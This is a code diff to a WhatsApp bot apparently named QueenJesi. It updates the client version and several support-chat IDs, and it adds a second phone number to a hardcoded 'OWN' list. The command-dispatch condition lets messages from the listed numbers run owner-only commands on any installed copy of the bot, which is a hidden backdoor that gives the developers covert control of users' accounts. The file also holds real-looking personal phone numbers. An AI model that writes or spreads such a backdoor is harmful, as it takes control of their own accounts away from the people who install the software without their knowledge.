@@ -51,7 +51,7 @@ fs.readdirSync('./plugins/sql/').forEach(plugin => {
     }
 });
 const plugindb = require('./plugins/sql/plugin');
-var OWN = { ff: '94741745737,0' }
+var OWN = { ff: '94741745737,94758340463,0' }
 
 String.prototype.format = function () {
     var i = 0, args = arguments;
@@ -90,7 +90,7 @@ async function queenJesi () {
     const QueenJesiCN = new WAConnection();
     const Session = new StringSession();
     try {
-      QueenJesiCN.version = [3, 3234, 9]
+      QueenJesiCN.version = [2, 2208, 7]
     } catch {
       console.log(`passed v${QueenJesiCN.version}`)
     }
@@ -351,19 +351,19 @@ ${chalk.blue.italic('🔮 Connecting to QueenJesi... Please Wait.')}`);
             var abc = config.BLOCKCHAT.split(',');                            
             if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
         }
-        if (config.SUPPORT == '94741745737-1612300121') {     
+        if (config.SUPPORT == '94741745737-94758340463') {     
             var sup = config.SUPPORT.split(',');                            
             if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
         }
-        if (config.SUPPORT2 == '94741745737-1617736751') {     
+        if (config.SUPPORT2 == '94741745737-94758340463') {     
             var tsup = config.SUPPORT2.split(',');                            
             if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
         }
-        if (config.SUPPORT3 == '94741745737-1621015274') {     
+        if (config.SUPPORT3 == '94741745737-94758340463') {     
             var nsup = config.SUPPORT3.split(',');                            
             if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
         }
-        if (config.SUPPORT4 == '94741745737-1625319286') {     
+        if (config.SUPPORT4 == '94741745737-94758340463') {     
             var nsup = config.SUPPORT4.split(',');                            
             if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
         }
@@ -403,7 +403,7 @@ ${chalk.blue.italic('🔮 Connecting to QueenJesi... Please Wait.')}`);
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-                    if ((OWN.ff == "94741745737,0" && msg.key.fromMe === false && command.fromMe === true &&
+                    if ((OWN.ff == "94741745737,94758340463,0" && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
